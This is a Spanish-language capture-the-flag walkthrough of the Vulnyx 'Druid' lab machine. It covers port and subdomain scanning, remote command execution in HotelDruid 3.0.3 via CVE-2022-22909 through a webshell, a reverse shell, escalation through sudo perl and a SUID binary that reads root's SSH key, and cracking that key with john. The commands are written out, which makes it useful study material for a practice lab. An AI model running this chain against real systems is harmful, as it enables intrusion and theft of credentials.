# Vulnyx Druid

Arp scan

```bash
arp-scan -I eth0 --localnet
(Ip-Victima)
```

```bash
nmap -p 22,80 -sS -sC -sV -n -Pn (Ip-Victima) -oN nmap
```

- 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.56 ((Debian))
  - http-title: Hotel
  - http-server-header: Apache/2.4.56 (Debian)

Bien, tenemos una web de un hotel donde al final encontramos un Email "info@hotel.nyx".

Así que subiremos `hotel.nyx` al `/etc/hosts`.

```bash
nano /etc/hosts
(Ip-Victima)    hotel.nyx
```

Ahora procedemos a hacer fuzzing, pero no encontramos nada nuevo. Decidimos hacer fuzzing de subdominios.

```bash
wfuzz --hc=404,400 --hl=616 -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -H 'host: FUZZ.hotel.nyx' -u (IP-víctima)
```

- reservations.hotel.nyx

Y encontramos una especie de software para hoteles. "HotelDruid 3.0.3". Buscando, encontramos un CVE asociado a la versión.

CVE-2022-22909

Nos permite ejecutar comandos de manera remota, procedemos a descargarlo y a usarlo.

Aquí el link de descarga:
http://reservations.hotel.nyx/dati/selectappartamenti.php?1=id

Luego lo usamos. Para utilizarlo, necesitamos cambiar la pass a `admin`, la cual la encontramos en "Configure and customize > User management".

```bash
python3 exploit.py -t http://reservations.hotel.nyx/ -u admin -p 1234
```

Esto crea una webshell dentro de una ruta, la cual se nos entrega con el mismo uso del script.

http://reservations.hotel.nyx/dati/selectappartamenti.php?1=whoami
- www-data

Ahora, procedemos a hacer una reverseshell urlencodeada para tomar acceso. Yo ya la tengo guardada, así que usaré esa. Pero para obtenerla, ingresar en "webshell-generator" y luego urlencodearla con Burpsuite.

Pegamos la reverseshell luego del `.php?=` nos ponemos en escucha con netcat, ejecutamos y ya ganamos acceso.

Ahora hacemos el tratamiento de la TTY

```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Vemos que tenemos un usuario llamado "sun" que tendrá más privilegios que nosotros siendo `www-data`.

```bash
sudo -l
(sun) NOPASSWD: /usr/bin/perl
```

Al ejecutar `sudo -l` vemos que podemos ejecutar `perl` como `sun`. Ingresamos a GTFObins y vemos que tenemos forma de abrir una bash como el usuario `sun`.

https://gtfobins.github.io/gtfobins/perl/

```bash
sudo -u sun /usr/bin/perl -e 'exec "/bin/sh";'
```

```bash
whoami
sun
```

Ahora toca escalar a root

```bash
find / -perm -4000 2>/dev/null
/usr/bin/super
```

Al investigar, vemos que tenemos una opción de "rev" el cual es un binario que lee archivos a la inversa. Entonces, podemos leer y copiar un archivo como root. Atacaremos al `id_rsa` de root

```bash
/usr/bin/super -H
super secret --> /usr/bin/rev
```

```bash
/usr/bin/super secret /root/.ssh/id_rsa > id_rsa
```

Ya tenemos el `id_rsa` de root, pero invertido, para cambiarlo haremos lo siguiente

```bash
rev id_rsa > id_rsa2
```

Ahora descargamos `id_rsa2`, cambiamos el nombre a `id_rsa`, lo crackeamos con john, damos permisos a `id_rsa` y entramos via ssh como root.

```bash
ssh2john id_rsa2 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
s****1
chmod 600 id_rsa
ssh -i id_rsa root@(ip_victima)
```
Y ya entramos como root :D
Y ya entramos como root :D
